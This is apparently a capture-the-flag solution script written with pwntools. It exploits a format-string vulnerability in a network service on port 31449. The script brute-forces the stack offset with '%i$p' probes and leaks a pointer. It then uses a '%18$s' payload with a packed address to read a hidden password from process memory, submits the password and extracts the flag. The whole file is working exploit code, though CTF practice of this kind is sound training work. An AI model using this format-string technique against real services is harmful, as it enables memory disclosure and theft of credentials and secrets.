#!/usr/bin/env python3
from pwn import *
import os
import re

context.log_level = 'critical'

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 31449)

def start(argv=[], *a, **kw):
    return connect(host, port)


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def find_offset():
    for i in range(1, 20):
        io = start()

        pl = flat({
            0: f'%{i}$$pp',
            10: 'AAAA',
        })

        io.recvuntil(b'>\x1b')
        io.sendline(pl)
        data = io.recvuntil(b'>\x1b')
        if b'0x41414141' in data:
            log.success(f'offset: {i}')
            return i
            

        io.close()
    

# offset = find_offset()
offset = 18

io = start()

data = io.recvuntil(b'>\x1b')
pointers = re.findall(b'0x(\w{4})', data)
plast_part = pointers[-1]
pointer = int('0804' + plast_part.decode(), 16)


log.info(f'Last pointer: 0x{pointer:x}')
pl = flat({
    0: f'%{offset}$$ss',
    10: p32(pointer),
})

io.sendline(pl)

data = io.recvuntil(b'>\x1b')
password = re.findall(b'>.*?(AlanOneLove)', data)[0]
io.sendline(password)

data = io.recvuntil(b'}')
flag = re.findall(b'(vka{[\w_]+)', data)[0].decode() + '}'

io.close()

print(flag)


